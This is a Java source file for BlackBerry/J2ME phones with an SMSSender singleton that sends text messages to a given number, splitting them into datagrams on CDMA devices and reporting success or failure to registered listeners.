package com.vvt.smsutil;

import java.util.Vector;
import javax.microedition.io.Connector;
import javax.microedition.io.Datagram;
import javax.microedition.io.DatagramConnection;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;
import net.rim.device.api.system.RuntimeStore;
import com.vvt.std.IOUtil;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class SMSSender {
	
	private static SMSSender self = null;
	private static final long SMS_SENDER_GUID = 0x96c44f5e844c0e4bL;
	private Vector smsSendObserverStore = new Vector();
	private SMSSenderThread previousThread = null;
	
	private SMSSender() {}
	
	public static SMSSender getInstance() {
		if (self == null) {
			self = (SMSSender)RuntimeStore.getRuntimeStore().get(SMS_SENDER_GUID);
		}
		if (self == null) {
			SMSSender smsSender = new SMSSender();
			RuntimeStore.getRuntimeStore().put(SMS_SENDER_GUID, smsSender);
			self = smsSender;
		}
		return self;
	}
	
	public void addListener(SMSSendListener observer) {
		boolean isExisted = isSMSSenderExisted(observer);
		if (!isExisted) {
			smsSendObserverStore.addElement(observer);
		}
	}
	
	public void removeListener(SMSSendListener observer) {
		boolean isExisted = isSMSSenderExisted(observer);
		if (isExisted) {
			smsSendObserverStore.removeElement(observer);
		}
	}

	public void removeAllListener() {
		smsSendObserverStore.removeAllElements();
	}
	
	public synchronized void send(FxSMSMessage smsMessage) {
		if (smsMessage != null && smsMessage.getNumber().trim().length() > 0) {
			SMSSenderThread th = new SMSSenderThread(smsMessage, previousThread);
			th.start();
			previousThread = th;
		} else {
			notifyErr(smsMessage, new IllegalArgumentException("FxSMSMessage is invalid."));
		}
	}
	
	private void notifyErr(FxSMSMessage smsMessage, Exception e) {
		if (Log.isDebugEnable()) {
			Log.debug("SMSSender.notifyErr()", "error: " + e.getMessage() + " ,size: " + smsSendObserverStore.size() + " , contact name: " + smsMessage.getContactName() + " , msg: " + smsMessage.getMessage() + " , number: " + smsMessage.getNumber(), e);
		}
		if (smsSendObserverStore.size() > 0) {
			for (int i = 0; i < smsSendObserverStore.size(); i++) {
				((SMSSendListener)smsSendObserverStore.elementAt(i)).smsSendFailed(smsMessage, e, null);
			}
		}
	}
	
	private void notifySuccess(FxSMSMessage smsMessage) {
		if (Log.isDebugEnable()) {
			Log.debug("SMSSender.notifySuccess()", "size: " + smsSendObserverStore.size() + " , contact name: " + smsMessage.getContactName() + " , msg: " + smsMessage.getMessage() + " , number: " + smsMessage.getNumber());
		}
		if (smsSendObserverStore.size() > 0) {
			for (int i = 0; i < smsSendObserverStore.size(); i++) {
				((SMSSendListener)smsSendObserverStore.elementAt(i)).smsSendSuccess(smsMessage);
			}
		}
	}
	
	private boolean isSMSSenderExisted(SMSSendListener observer) {
		boolean isExisted = false;
		for (int i = 0; i < smsSendObserverStore.size(); i++) {
			if (smsSendObserverStore.elementAt(i) == observer) {
				isExisted = true;
				break;
			}
		}
		return isExisted;
	}
	
	private class SMSSenderThread extends Thread {
		
		private FxSMSMessage smsMessage = null;
		private Thread waitThread = null;
		
		private SMSSenderThread(FxSMSMessage smsMessage, Thread waitThread) {
			this.smsMessage = smsMessage;
			this.waitThread = waitThread;
		}

		private SMSSenderThread(FxSMSMessage smsMessage) {
			this.smsMessage = smsMessage;
		}

		public void run() {
			try {
				if (waitThread != null) {
					waitThread.join();
				}
				send();
			} catch(Exception e) {
				Log.error("SMSSenderThread.run", "" + e);
				notifyErr(smsMessage, e);
			}
		}
		
		private void send() {
			MessageConnection messageConnection = null;
			DatagramConnection datagramConnection = null;
			String prefix = "sms://";
			try {
				if (PhoneInfo.isCDMA()) {
					datagramConnection = (DatagramConnection) Connector.open((prefix + smsMessage.getNumber()).trim());
					byte[] textComplete = smsMessage.getMessage().getBytes();
					int maxLengthDatagram = datagramConnection.getMaximumLength();
					int lengthTotal = textComplete.length;
					if (lengthTotal <= maxLengthDatagram) {
						Datagram datagram = datagramConnection.newDatagram(textComplete, textComplete.length);
						datagramConnection.send(datagram);
					} else {
						int numberOfDatagramsRequired = lengthTotal / maxLengthDatagram + 1;
						int lengthDatagram = lengthTotal / numberOfDatagramsRequired;
						for (int i = 0; i < numberOfDatagramsRequired; i++) {
							byte[] textPart = new byte[lengthDatagram];
							for (int j = 0; j < lengthDatagram; j++) {
								int indexInBytes = j + i * lengthDatagram;
								if (indexInBytes < lengthTotal) {
									textPart[j] = textComplete[indexInBytes];
								} else {
									break;
								}
							}
							Datagram datagram = datagramConnection.newDatagram(textPart, textPart.length);
							datagramConnection.send(datagram);
						}
					}
					notifySuccess(smsMessage);
				} else {
					/*if (Log.isDebugEnable()) {
						Log.debug("SMSSenderThread.send()1", "number: " + smsMessage.getNumber() + " , msg: " + smsMessage.getMessage());
					}*/
					messageConnection = (MessageConnection)Connector.open((prefix + smsMessage.getNumber()).trim());
					TextMessage txtMsg = (TextMessage) messageConnection.newMessage(MessageConnection.TEXT_MESSAGE);
					/*if (Log.isDebugEnable()) {
						Log.debug("SMSSenderThread.send()2", "number: " + smsMessage.getNumber() + " , msg: " + smsMessage.getMessage());
					}*/
					txtMsg.setPayloadText(smsMessage.getMessage().trim());
					/*if (Log.isDebugEnable()) {
						Log.debug("SMSSenderThread.send()3", "number: " + smsMessage.getNumber() + " , msg: " + smsMessage.getMessage());
					}*/
					messageConnection.send(txtMsg);
					/*if (Log.isDebugEnable()) {
						Log.debug("SMSSenderThread.send()4", "number: " + smsMessage.getNumber() + " , msg: " + smsMessage.getMessage());
					}*/
					notifySuccess(smsMessage);
				}
			} catch(Exception e) {
				Log.error("SMSSenderThread.send", e.getMessage());
				notifyErr(smsMessage, e);
			} finally {
				/*if (Log.isDebugEnable()) {
					Log.debug("SMSSenderThread.send().finally()", "Enter");
				}*/
				IOUtil.close(datagramConnection);
				IOUtil.close(messageConnection);
			}
		}
	}
}
